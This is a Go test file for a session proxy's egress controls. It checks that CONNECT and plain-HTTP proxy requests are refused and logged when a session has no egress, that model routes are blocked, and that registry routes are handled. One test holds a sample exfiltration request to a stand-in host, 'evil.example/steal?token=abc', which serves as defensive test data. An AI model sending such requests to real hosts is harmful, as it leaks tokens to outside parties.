package sessionproxy

import (
	"bufio"
	"context"
	"net"
	"net/http"
	"strings"
	"testing"

	"projectmesh.io/mesh-cli/internal/egress"
)

// The relay's socket hands an egress request to the lease's tunnel, and
// with none refuses it; NoModel refuses the model route.
func TestProxyEgressGoesToTheTunnelAndNoModelRefusesTheModelRoute(t *testing.T) {
	for _, tc := range []struct {
		name   string
		tunnel *egress.Tunnel
		code   string
	}{
		{"none", nil, "no_egress"},
		{"tunnel", &egress.Tunnel{Policy: egress.NewPolicy(nil, nil, nil)}, "host"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			p := New(nil)
			p.Egress = tc.tunnel
			p.NoModel = true
			p.Model = &Model{}
			_, sock := listen(t, p)
			c := &http.Client{Transport: &http.Transport{DialContext: func(ctx context.Context, _, _ string) (net.Conn, error) {
				return (&net.Dialer{}).DialContext(ctx, "unix", sock)
			}}}
			req, _ := http.NewRequest(http.MethodConnect, "http://relay", nil)
			req.Host = "registry.npmjs.org:443"
			req.URL.Host = "registry.npmjs.org:443"
			resp, err := c.Do(req)
			if err != nil {
				t.Fatal(err)
			}
			resp.Body.Close()
			if resp.StatusCode != http.StatusForbidden || resp.Header.Get(egress.RefusedHeader) != tc.code {
				t.Fatalf("CONNECT answered %d %v", resp.StatusCode, resp.Header)
			}
			resp, err = c.Post("http://relay"+ModelPrefix+"anthropic/v1/messages", "application/json", strings.NewReader("{}"))
			if err != nil {
				t.Fatal(err)
			}
			resp.Body.Close()
			if resp.StatusCode != http.StatusForbidden || resp.Header.Get(egress.RefusedHeader) != "model" {
				t.Fatalf("a model call with NoModel answered %d %v", resp.StatusCode, resp.Header)
			}
		})
	}
}

// An egress request refused for want of any egress is heard by host and
// port alone, rule egress.none: a CONNECT, and a plain-HTTP proxy
// request whose path and query never reach the hook.
func TestProxyHearsEgressRefusedForWantOfEgress(t *testing.T) {
	p := New(nil)
	var heard []egress.Call
	p.EgressRefused = func(c egress.Call) { heard = append(heard, c) }
	_, sock := listen(t, p)
	for _, line := range []string{
		"CONNECT paste.example:443 HTTP/1.1\r\nHost: paste.example:443\r\n\r\n",
		"GET http://evil.example:8080/steal?token=abc HTTP/1.1\r\nHost: evil.example:8080\r\n\r\n",
	} {
		c, err := net.Dial("unix", sock)
		if err != nil {
			t.Fatal(err)
		}
		c.Write([]byte(line))
		resp, err := http.ReadResponse(bufio.NewReader(c), nil)
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()
		c.Close()
		if resp.StatusCode != http.StatusForbidden {
			t.Fatalf("%q answered %d", line, resp.StatusCode)
		}
	}
	want := []egress.Call{
		{Host: "paste.example", Port: "443", Rule: egress.RuleNone, Refused: "the session has no egress"},
		{Host: "evil.example", Port: "8080", Rule: egress.RuleNone, Refused: "the session has no egress"},
	}
	if len(heard) != 2 || heard[0] != want[0] || heard[1] != want[1] {
		t.Fatalf("heard %+v", heard)
	}
}

// The registry routes go to the lease's registry, and with none are
// answered 404, never relayed elsewhere.
func TestProxyServesTheRegistryRoutes(t *testing.T) {
	p := New(nil)
	c, _ := listen(t, p)
	for _, path := range []string{"/v2/", "/artifacts/acme/web/cli/1/cli"} {
		resp, err := c.Get("http://relay" + path)
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()
		if resp.StatusCode != http.StatusNotFound {
			t.Fatalf("%s with no registry answered %d", path, resp.StatusCode)
		}
	}
	var heard []string
	p.Registry = http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { heard = append(heard, r.URL.Path) })
	for _, path := range []string{"/v2/", "/v2/acme/web/app/manifests/x", "/artifacts/acme/web/cli/1/cli"} {
		resp, err := c.Get("http://relay" + path)
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()
	}
	if len(heard) != 3 {
		t.Fatalf("the registry heard %v", heard)
	}
}
